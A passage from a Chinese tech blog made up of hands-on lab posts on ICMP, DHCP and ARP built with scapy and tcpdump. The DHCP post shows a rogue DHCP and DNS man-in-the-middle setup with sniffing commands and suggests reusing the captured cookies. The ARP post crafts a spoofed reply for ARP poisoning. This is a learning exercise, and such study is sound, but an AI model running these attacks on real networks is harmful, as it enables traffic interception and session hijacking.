<span class="number">22</span>:<span class="number">59</span>:<span class="number">10.235963</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.97</span><span class="number">.200</span>: ICMP echo reply, id <span class="number">0</span>, seq <span class="number">0</span>, <span class="built_in">length</span> <span class="number">8</span>

 ~ ⮀ ping <span class="number">10.210</span><span class="number">.97</span><span class="number">.200</span>
PING <span class="number">10.210</span><span class="number">.97</span><span class="number">.200</span> (<span class="number">10.210</span><span class="number">.97</span><span class="number">.200</span>) <span class="number">56</span>(<span class="number">84</span>) <span class="keyword">bytes</span> <span class="operator">of</span> data.
<span class="number">64</span> <span class="keyword">bytes</span> <span class="built_in">from</span> <span class="number">10.210</span><span class="number">.97</span><span class="number">.200</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">63</span> <span class="built_in">time</span>=<span class="number">0.520</span> ms
<span class="number">64</span> <span class="keyword">bytes</span> <span class="built_in">from</span> <span class="number">10.210</span><span class="number">.97</span><span class="number">.200</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">63</span> <span class="built_in">time</span>=<span class="number">0.559</span> ms
</code></pre><p>丧心病狂，说明路由存在ip就转发了，不存在就默默丢弃了。至于<code>10.210.97.195</code>是什么毛病会给我个协议不可达(它可能是个路由器)……<code>Who can tell me...</code></p>
<h2 id="ICMP与操作系统探测">ICMP与操作系统探测</h2><p><a href="http://althing.cs.dartmouth.edu/local/ICMP_Scanning_v3.0.pdf" target="_blank" rel="external">ICMP Usage in Scanning</a>的作者也是xprobe的作者，我不打算继续玩ICMP这项深坑了：</p>
<pre><code><span class="preprocessor"># eix xprobe</span>
* net-analyzer/xprobe
     Available versions:  ~<span class="number">0.3</span>
     Homepage:            http:<span class="comment">//sys-security.com/blog/xprobe2</span>
     Description:         Active OS fingerprinting tool - <span class="keyword">this</span> is Xprobe2
</code></pre><h2 id="ICMP_source_quench">ICMP source quench</h2><p>应该被废弃的(2012年的RFC6633)协议，流量控制应该交给TCP来做。如果要伪造需要猜测TCP序号，端口号等(前八字节)。</p>
<p>我试着发了发包……看样子路由比我的网卡强大太多了。</p>
<h2 id="ICMP_重定向">ICMP 重定向</h2><p>扔一个参考资料，用hping的<a href="http://www.bcitr.com/files/icmp-redir.pdf" target="_blank" rel="external">How To – Poison Route Cache Using ICMP Redirect</a></p>
<p>待我哪天土豪了再说吧……最起码现在我的安卓功能受限，总之我没模拟出来啥效果。反正我在一个网段试了试完全没动静。其实我觉得应该现在操作系统都会检查ICMP报文中的IP报头和IP报文数据前八字节吧。那又得猜TCP端口号和序列号了不是？</p>
<p>FIXME:<a href="http://en.wikipedia.org/wiki/ICMP_tunnel" target="_blank" rel="external">ICMP Tunnel</a>，有空试试。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/03/07/play-dhcp/" itemprop="url">
                  Playing and Learning DHCP in Action
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-03-07T00:00:00+08:00" content="2014-03-07">
              2014-03-07
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/03/07/play-dhcp/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/03/07/play-dhcp/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="实验准备">实验准备</h2><ul>
<li>scapy：用来伪造dhcp/dns服务器，抓包(调用tcpdump)</li>
<li>tcpdump/wireshark：来观察网络流量。</li>
<li>twisted来建立dns服务器</li>
<li>某个测试机器和某路由无线网络</li>
</ul>
<h2 id="一点DHCP协议基础">一点DHCP协议基础</h2><p>DHCP是，是干啥的呢？简单来说是为了自动化为网络中的主机配置各种配置，包括ip地址，网关，域名服务器等等。</p>
<p>有篇不错的<a href="http://jeffyyko.blog.51cto.com/28563/163168" target="_blank" rel="external">中文教程</a>带你回顾整个dhcp服务过程，然而，事情不总是这样的。比如linux和安卓一般默认就没有arping检查重复ip的过程。</p>
<h2 id="Rogue_DHCP_Server">Rogue DHCP Server</h2><p>流氓服务器，指非法在网络中提供dhcp服务的机器。由于dhcp服务没有认证过程，任何dhcp服务器都能为网络上的机器提供服务。实际上就是几个服务器竞争看谁反应快客户端就使用谁，这为中间人攻击提供了可能。</p>
<h2 id="一次中间人攻击">一次中间人攻击</h2><p>我们试着搭建一个流氓dhcp服务器来指向错误的网关和dns(即我们自己)。</p>
<p>本机的ip地址是<code>192.168.1.101</code>，这是无线路由中dhcp服务器分配的。为了让实验一定成功，最好干脆把无线路由的dhcp功能关掉，自己手动配置地址<code>192.168.1.101</code>，然后搭建个dhcp服务器。</p>
<p>首先，确认设置ip转发功能：</p>
<pre><code>gentoo ~ <span class="preprocessor"># echo <span class="number">1</span> &gt; /proc/sys/net/ipv4/ip_forward</span>
</code></pre><p>首先，用scapy搭建一个dhcp服务器，把网关指向自己。scapy中<code>DHCP_am</code>的设计就是把<code>nameserver</code>也指向网关，可参考源代码。</p>
<pre><code><span class="prompt">&gt;&gt;</span>&gt; dhcp_server= <span class="constant">DHCP_am</span>()
<span class="prompt">&gt;&gt;</span>&gt; dhcp_server.gw=<span class="string">'192.168.1.101'</span>
<span class="prompt">&gt;&gt;</span>&gt; dhcp_server()
</code></pre><p>监听观察，发现默认网关的dhcp服务器竟然给了一个<code>dhcpnak</code>：</p>
<pre><code> ~ ⮀ sudo tcpdump -<span class="tag">i</span> wlan0 port <span class="number">67</span> or port <span class="number">68</span> 
tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode
listening on wlan0, link-type EN10MB (Ethernet), capture size <span class="number">65535</span> bytes
<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.634526</span> IP <span class="number">0.0</span>.<span class="number">0.0</span><span class="class">.bootpc</span> &gt; <span class="number">255.255</span>.<span class="number">255.255</span><span class="class">.bootps</span>: BOOTP/DHCP, Request from <span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span> (oui Unknown), length <span class="number">302</span>
<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.681009</span> IP <span class="number">192.168</span>.<span class="number">1.101</span><span class="class">.bootps</span> &gt; <span class="number">192.168</span>.<span class="number">1.128</span><span class="class">.bootpc</span>: BOOTP/DHCP, Reply, length <span class="number">296</span>
<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.688288</span> IP <span class="number">0.0</span>.<span class="number">0.0</span><span class="class">.bootpc</span> &gt; <span class="number">255.255</span>.<span class="number">255.255</span><span class="class">.bootps</span>: BOOTP/DHCP, Request from <span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span> (oui Unknown), length <span class="number">314</span>
<span class="number">23</span>:<span class="number">18</span>:<span class="number">55.781062</span> IP <span class="number">192.168</span>.<span class="number">1.101</span><span class="class">.bootps</span> &gt; <span class="number">192.168</span>.<span class="number">1.128</span><span class="class">.bootpc</span>: BOOTP/DHCP, Reply, length <span class="number">296</span>
<span class="number">23</span>:<span class="number">18</span>:<span class="number">56.124282</span> IP <span class="number">192.168</span>.<span class="number">1.1</span><span class="class">.bootps</span> &gt; <span class="number">255.255</span>.<span class="number">255.255</span><span class="class">.bootpc</span>: BOOTP/DHCP, Reply, length <span class="number">548</span>
</code></pre><p>用twisted建立一个DNS服务器[^1]：</p>
<pre><code><span class="comment">sudo</span> <span class="comment">twistd</span> <span class="literal">-</span><span class="comment">n</span> <span class="comment">dns</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">recursive</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">cache</span>
</code></pre><p>在scapy中开始中间人攻击(窃听)，比如窃听http头：</p>
<pre><code>pkts = sniff(filter=<span class="string">"(tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)) and host 192.168.1.128 and (not host 192.168.1.1)"</span>,iface=<span class="string">"wlan0"</span>, prn=lambda <span class="keyword">x</span>: <span class="keyword">x</span>.<span class="keyword">sprintf</span>(<span class="string">"{IP:<span class="variable">%IP</span>.src% -&gt; <span class="variable">%IP</span>.dst<span class="variable">%\</span>n}{Raw:<span class="variable">%Raw</span>.load<span class="variable">%\</span>n}"</span>))
<span class="number">192.168</span>.<span class="number">1.128</span> -&gt; <span class="number">123.125</span>.<span class="number">70.102</span>
<span class="string">'GET /tongji/anchor?type=webapp_pv&amp;t=1394205309005&amp;page=carousel HTTP/1.1\r\nHost: wk.baidu.com\r\nAccept-Encod此处略去具体信息'</span>
</code></pre><p>搞到cookie后尽情发挥吧，可以用temper data这种东西在火狐里试下。当然，cookie可以在各种地方比如requests啊selenium里啊使用。</p>
<p>完工。其实后来实验时无线路由dhcp服务器被选中了，然后我的rogue dhcp server就一直处于无用状态。</p>
<p>FIXME：可以尝试一个dhcprelease来试着解除租约，可能涉及xid或transaction ID这些东西的监听和伪造。也许会在查阅更多资料后尝试，也许。</p>
<p>Update：以下这个链接做了这些，不过，它怎么获得xid(transaction id)的不是很明白，要赶在dhcp client的dhcprequest发出之后dhcp server返回dhcpack之前向dhcp client注入dhcpnak，好像得在开始建立连接的时候就开始监听，获取transaction id，直接就伪装成dhcp服务器想客户端发送dhcpnak。</p>
<ul>
<li><a href="http://www.backtrack-linux.org/forums/showthread.php?t=25132" target="_blank" rel="external">http://www.backtrack-linux.org/forums/showthread.php?t=25132</a></li>
</ul>
<p>[^1]: 最开始我用scapy来建立dns服务器： <code>dns_spoof()</code>.关于用scapy做DNS转发服务器，参见PacketGeek上scapy的教程<a href="http://thepacketgeek.com/scapy-p-09-scapy-and-dns/" target="_blank" rel="external">Scapy and DNS</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/03/04/play-arp/" itemprop="url">
                  Playing and Learning ARP in Action
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-03-04T00:00:00+08:00" content="2014-03-04">
              2014-03-04
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/03/04/play-arp/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/03/04/play-arp/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="实验准备">实验准备</h2><p>这是我的工具：</p>
<ul>
<li>一台linux机器，内核支持ip转发，arp代理。带无线网卡和有线网卡。比如一台笔记本电脑。</li>
<li>linux机器装好scapy，tcpdump</li>
<li>网线，不一定是双绞线，现代网卡都应该支持双向通信模式的转换。</li>
<li>一台windows台式机，带有线网卡和接口。</li>
</ul>
<h2 id="一点scapy的小基础">一点scapy的小基础</h2><p>scapy是一种基于python的包操作工具，在python上实现了一种DSL(领域特定语言)。定义一个包很简单。比如一个<code>Ether</code>：</p>
<pre><code><span class="function"><span class="title">Ether</span><span class="params">(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>
</code></pre><p>封包里的字段可以<code>ls</code>来查看：</p>
<pre><code><span class="function"><span class="title">ls</span><span class="params">(Ether)</span></span>
</code></pre><p>当我们想让一个Ethernet包封装一个IP包时，仅仅使用一个<code>/</code>:</p>
<pre><code>ip = <span class="function"><span class="title">Ether</span><span class="params">()</span></span>/<span class="function"><span class="title">IP</span><span class="params">()</span></span>
</code></pre><p>当我们想发包时，如果想在第三层上网络层以上发包：</p>
<pre><code><span class="function"><span class="title">send</span><span class="params">(ip)</span></span>
</code></pre><p>但你要发一个ARP包(在第二层上发包)的话，要用<code>srp</code>或<code>srp1</code>。</p>
<h2 id="arp如何工作">arp如何工作</h2><p>计算机仅仅知道ip地址是无法通信的，ip数据报在封装到数据链路层中时需要加上比如以太网报头，报头中应该含有数据链路层能理解的地址即MAC地址。ARP就是着么一种将IP转换成MAC地址的协议。</p>
<p>如下例子，当我们Ping一台机器时，如果该ip在arp缓存中有，就可以直接找到mac地址，如果没有，就会广播一个请求询问对应ip的mac地址。</p>
<pre><code>~/Work/project/arp-pos ⮀ sudo arp -d <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>
~/Work/project/arp-pos ⮀ ping -c <span class="number">1</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>
PING <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span> (<span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>) <span class="number">56</span>(<span class="number">84</span>) <span class="keyword">bytes</span> <span class="operator">of</span> data.
<span class="number">64</span> <span class="keyword">bytes</span> <span class="built_in">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> <span class="built_in">time</span>=<span class="number">142</span> ms

<span class="comment">--- 192.168.1.113 ping statistics ---</span>
<span class="number">1</span> packets transmitted, <span class="number">1</span> received, <span class="number">0</span>% packet loss, <span class="built_in">time</span> <span class="number">0</span>ms
rtt <span class="built_in">min</span>/<span class="built_in">avg</span>/<span class="built_in">max</span>/mdev = <span class="number">142.484</span>/<span class="number">142.484</span>/<span class="number">142.484</span>/<span class="number">0.000</span> ms

 ~ ⮀ sudo tcpdump -vv -eqtnni wlan0 arp
tcpdump: listening <span class="command"><span class="keyword">on</span> <span class="title">wlan0</span>, <span class="title">link-type</span> <span class="title">EN10MB</span> (<span class="title">Ethernet</span>), <span class="title">capture</span> <span class="title">size</span> <span class="title">65535</span> <span class="title">bytes</span></span>
<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> &gt; ff:ff:ff:ff:ff:ff, ARP, <span class="built_in">length</span> <span class="number">42</span>: Ethernet (<span class="built_in">len</span> <span class="number">6</span>), IPv4 (<span class="built_in">len</span> <span class="number">4</span>), Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span> tell <span class="number">192.168</span><span class="number">.1</span><span class="number">.106</span>, <span class="built_in">length</span> <span class="number">28</span>
<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span> &gt; <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>, ARP, <span class="built_in">length</span> <span class="number">42</span>: Ethernet (<span class="built_in">len</span> <span class="number">6</span>), IPv4 (<span class="built_in">len</span> <span class="number">4</span>), Reply <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span> is-<span class="keyword">at</span> <span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">22</span>, <span class="built_in">length</span> <span class="number">28</span>
</code></pre><h2 id="抓包观察">抓包观察</h2><p>让我们看看机器获取IP的过程。这里我们用tcpdump，你可以在任何linux发行版的源里找到它。当然，也可以用wireshark。</p>
<pre><code> ~ ⮀ sudo tcpdump -e -i wlan0 port bootps or port bootpc or arp
tcpdump: WARNING: wlan0: no IPv4 address assigned
tcpdump: verbose output suppressed, <span class="operator"><span class="keyword">use</span> -v <span class="keyword">or</span> -vv <span class="keyword">for</span> <span class="keyword">full</span> protocol <span class="keyword">decode</span>
listening <span class="keyword">on</span> wlan0, <span class="keyword">link</span>-<span class="keyword">type</span> EN10MB (Ethernet), capture <span class="keyword">size</span> <span class="number">65535</span> <span class="keyword">bytes</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">19.202074</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype IPv4 (<span class="number">0x0800</span>), <span class="keyword">length</span> <span class="number">371</span>: <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>.bootpc &gt; <span class="number">255.255</span><span class="number">.255</span><span class="number">.255</span>.bootps: BOOTP/DHCP, Request <span class="keyword">from</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>), <span class="keyword">length</span> <span class="number">329</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">19.277875</span> ec:<span class="number">88</span>:<span class="number">8</span><span class="keyword">f</span>:b4:d6:<span class="number">68</span> (oui <span class="keyword">Unknown</span>) &gt; <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>), ethertype IPv4 (<span class="number">0x0800</span>), <span class="keyword">length</span> <span class="number">590</span>: <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>.bootps &gt; <span class="number">192.168</span><span class="number">.1</span><span class="number">.101</span>.bootpc: BOOTP/DHCP, Reply, <span class="keyword">length</span> <span class="number">548</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">19.352068</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">20.720541</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">22.155087</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">24.232076</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">26.234201</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span> tell <span class="number">192.168</span><span class="number">.1</span><span class="number">.102</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">27.502047</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>) &gt; Broadcast, ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Request who-has <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> tell <span class="number">192.168</span><span class="number">.1</span><span class="number">.101</span>, <span class="keyword">length</span> <span class="number">28</span>
<span class="number">21</span>:<span class="number">54</span>:<span class="number">27.514492</span> ec:<span class="number">88</span>:<span class="number">8</span><span class="keyword">f</span>:b4:d6:<span class="number">68</span> (oui <span class="keyword">Unknown</span>) &gt; <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> (oui <span class="keyword">Unknown</span>), ethertype ARP (<span class="number">0x0806</span>), <span class="keyword">length</span> <span class="number">42</span>: Reply <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="keyword">is</span>-<span class="keyword">at</span> ec:<span class="number">88</span>:<span class="number">8</span><span class="keyword">f</span>:b4:d6:<span class="number">68</span> (oui <span class="keyword">Unknown</span>), <span class="keyword">length</span> <span class="number">28</span></span>
</code></pre><p>可以看到，先是dhcp的过程，下次我们再讲。紧接着我们的机器发出一个ARP探针(Probe)，哦，发了好几次来确认没有机器使用<code>192.168.1.1</code>，于是接着发了两个announcement宣告拥有了这个ip。接着询问<code>192.168.1.1</code>的MAC地址并收到来自<code>192.168.1.1</code>的回复。</p>
<h2 id="一个广播的ARP请求">一个广播的ARP请求</h2><p>为了实验正确，我们先删除arp缓存内容：</p>
<pre><code>~/Work/project/arp ⮀ sudo arp -d <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
~/Work/project/arp ⮀ sudo arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
  <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>                    (incomplete)                              eth0
</code></pre><p>首先，我们作为<code>10.210.96.200</code>，想知道<code>10.210.96.193</code>的MAC地址，我们广播一个ARP请求：</p>
<pre><code>我是<span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>,我的MAC地址是<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>,我想知道<span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>的IP地址是什么。
</code></pre><p>让我们先探索下ARP包的结构。</p>
<pre><code>&gt;&gt;&gt; ls(ARP)
<span class="string">hwtype     :</span> XShortField          = (<span class="number">1</span>)
<span class="string">ptype      :</span> XShortEnumField      = (<span class="number">2048</span>)
<span class="string">hwlen      :</span> ByteField            = (<span class="number">6</span>)
<span class="string">plen       :</span> ByteField            = (<span class="number">4</span>)
<span class="string">op         :</span> ShortEnumField       = (<span class="number">1</span>)
<span class="string">hwsrc      :</span> ARPSourceMACField    = (None)
<span class="string">psrc       :</span> SourceIPField        = (None)
<span class="string">hwdst      :</span> MACField             = (<span class="string">'00:00:00:00:00:00'</span>)
<span class="string">pdst       :</span> IPField              = (<span class="string">'0.0.0.0'</span>)
</code></pre><p>参见<a href="http://en.wikipedia.org/wiki/Address_Resolution_Protocol#Packet_structure" target="_blank" rel="external">ARP协议封包结构</a></p>
<p>首先我们构造一个ARP请求。该请求工作在Ethernet上(<code>0x0001</code>)，协议类型是IPv4(<code>0x0800</code>), 是一个请求(<code>0x0001</code>或<code>who-has</code>)，发送者的MAC地址是<code>11:11:11:11:11:11</code>, 发送者的协议地址是<code>10.210.96.200</code>，想要知道MAC地址的协议地址是<code>10.210.96.193</code>。根据以太网包字段，该消息通过广播发送。</p>
<pre><code>arp_request = <span class="function"><span class="title">Ether</span><span class="params">(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0001,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, psrc=<span class="string">'10.210.96.200'</span>, pdst=<span class="string">'10.210.96.193'</span>)</span></span>
</code></pre><p>scapy会自动为我们设置<code>Ether</code>的某些字段，所以我们不用都指定。</p>
<pre><code>&gt;&gt;&gt; arp_request.show()
<span class="preprocessor">###[ Ethernet ]###</span>
  dst= ff:ff:ff:ff:ff:ff
  src= <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>
  type= <span class="number">0x806</span>
<span class="preprocessor">###[ ARP ]###</span>
     hwtype= <span class="number">0x1</span>
     ptype= <span class="number">0x800</span>
     hwlen= <span class="number">6</span>
     plen= <span class="number">4</span>
     op= who-has
     hwsrc= <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>
     psrc= <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>
     hwdst= <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>
     pdst= <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
</code></pre><p>紧接着发送它：</p>
<pre><code>&gt;&gt;&gt; recv = srp(arp_request)
Begin emission:
Finished to send <span class="number">1</span> packets.
*
Received <span class="number">1</span> packets, got <span class="number">1</span> answers, remaining <span class="number">0</span> packets
&gt;&gt;&gt; recv
(&lt;Results: TCP:<span class="number">0</span> UDP:<span class="number">0</span> ICMP:<span class="number">0</span> Other:<span class="number">1</span>&gt;, &lt;Unanswered: TCP:<span class="number">0</span> UDP:<span class="number">0</span> ICMP:<span class="number">0</span> Other:<span class="number">0</span>&gt;)
&gt;&gt;&gt; recv[<span class="number">0</span>].show()
<span class="number">0000</span> Ether / ARP who has <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span> says <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> ==&gt; Ether / ARP is at <span class="number">3</span>c:e5:a6:d2:<span class="number">39</span>:ad says <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span> / Padding
</code></pre><p>可见我们得到了它的MAC地址。检查ARP缓存：</p>
<pre><code>~/Work/project/arp ⮀ sudo arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
<span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>            ether   <span class="number">3</span>c:e5:a6:d2:<span class="number">39</span>:ad   C                     eth0
</code></pre><p>Bingo!</p>
<h2 id="一个ARP应答">一个ARP应答</h2><p>首先要设置静态IP。将一台win7机器设置为<code>172.16.0.17</code>.</p>
<p>接着我们要发一个不请自答的ARP reply，这一技术常用来进行ARP Poison。</p>
<pre><code>&gt;&gt;&gt; arp_reply = <span class="function"><span class="title">Ether</span><span class="params">(src=<span class="string">'11:11:11:11:11:11'</span>, dst=<span class="string">'C8:1F:66:05:E2:6A'</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0002,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, hwdst=<span class="string">'C8:1F:66:05:E2:6A'</span>, psrc=<span class="string">'172.16.0.28'</span>, pdst=<span class="string">'172.16.0.17'</span>)</span></span>
recv = <span class="function"><span class="title">srp</span><span class="params">(arp_reply, timeout=<span class="number">1</span>, iface=<span class="string">'eth0'</span>)</span></span>
</code></pre><p>查看我们的监听：</p>
<pre><code> ~ ⮀ sudo  tcpdump -nni eth0 arp 
tcpdump: verbose output suppressed, <span class="operator"><span class="keyword">use</span> -v <span class="keyword">or</span> -vv <span class="keyword">for</span> <span class="keyword">full</span> protocol <span class="keyword">decode</span>
listening <span class="keyword">on</span> eth0, <span class="keyword">link</span>-<span class="keyword">type</span> EN10MB (Ethernet), capture <span class="keyword">size</span> <span class="number">65535</span> <span class="keyword">bytes</span>
<span class="number">17</span>:<span class="number">22</span>:<span class="number">10.465636</span> ARP, Reply <span class="number">172.16</span><span class="number">.0</span><span class="number">.28</span> <span class="keyword">is</span>-<span class="keyword">at</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>, <span class="keyword">length</span> <span class="number">28</span></span>
</code></pre><p>然而检查另一台机器的arp缓存可能并没有<code>172.16.0.28</code>的项。这是因为操作系统可能不欢迎不请自来的arp应答。</p>
<p>我们试着使用不请自来的arp请求看看：</p>
